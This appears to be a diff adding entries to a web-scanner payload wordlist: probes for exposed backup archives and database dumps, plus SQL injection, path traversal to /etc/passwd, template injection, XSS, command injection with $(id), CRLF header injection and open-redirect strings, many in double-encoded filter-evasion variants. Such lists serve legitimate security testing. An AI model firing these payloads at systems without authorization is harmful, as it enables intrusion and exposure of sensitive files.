@@ -78,3 +78,163 @@ HTTP%3A%2F%2F127.0.0.1
 HTTPS%3A%2F%2FEXAMPLE.COM
 ' OR '1'%3D'1
 " OR "1"%3D"1
+%252Fbackup.zip
+/backup.zip?aurose=1
+/backup.zip&aurose=1
+/backup.zip.bak
+/backup.zip.old
+/site-backup.tar.gz
+%2Fsite-backup.tar.gz
+%252Fsite-backup.tar.gz
+/SITE-BACKUP.TAR.GZ
+/site-backup.tar.gz?aurose=1
+/site-backup.tar.gz&aurose=1
+/site-backup.tar.gz.bak
+/site-backup.tar.gz.old
+/db_backup.sql
+%2Fdb_backup.sql
+%252Fdb_backup.sql
+/DB_BACKUP.SQL
+/db_backup.sql?aurose=1
+/db_backup.sql&aurose=1
+/db_backup.sql.bak
+/db_backup.sql.old
+/wwwroot.zip
+%2Fwwwroot.zip
+%252Fwwwroot.zip
+/WWWROOT.ZIP
+/wwwroot.zip?aurose=1
+/wwwroot.zip&aurose=1
+/wwwroot.zip.bak
+/wwwroot.zip.old
+/public_html.tar
+%2Fpublic_html.tar
+%252Fpublic_html.tar
+/PUBLIC_HTML.TAR
+/public_html.tar?aurose=1
+/public_html.tar&aurose=1
+/public_html.tar.bak
+/public_html.tar.old
+/backup_2024.sql.gz
+%2Fbackup_2024.sql.gz
+%252Fbackup_2024.sql.gz
+/BACKUP_2024.SQL.GZ
+/backup_2024.sql.gz?aurose=1
+/backup_2024.sql.gz&aurose=1
+/backup_2024.sql.gz.bak
+/backup_2024.sql.gz.old
+/old_site.rar
+%2Fold_site.rar
+%252Fold_site.rar
+/OLD_SITE.RAR
+/old_site.rar?aurose=1
+/old_site.rar&aurose=1
+/old_site.rar.bak
+/old_site.rar.old
+/snapshot.tgz
+%2Fsnapshot.tgz
+%252Fsnapshot.tgz
+/SNAPSHOT.TGZ
+/snapshot.tgz?aurose=1
+/snapshot.tgz&aurose=1
+/snapshot.tgz.bak
+/snapshot.tgz.old
+/archive.7z
+%2Farchive.7z
+%252Farchive.7z
+/ARCHIVE.7Z
+/archive.7z?aurose=1
+/archive.7z&aurose=1
+/archive.7z.bak
+/archive.7z.old
+/source_code.zip
+%2Fsource_code.zip
+%252Fsource_code.zip
+/SOURCE_CODE.ZIP
+/source_code.zip?aurose=1
+/source_code.zip&aurose=1
+/source_code.zip.bak
+/source_code.zip.old
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+/backup.zip::var0
+%2Fbackup.zip::v0
+/backup/probe/0
+/site-backup.tar.gz::var1
+%2Fsite-backup.tar.gz::v1
+/backup/probe/1
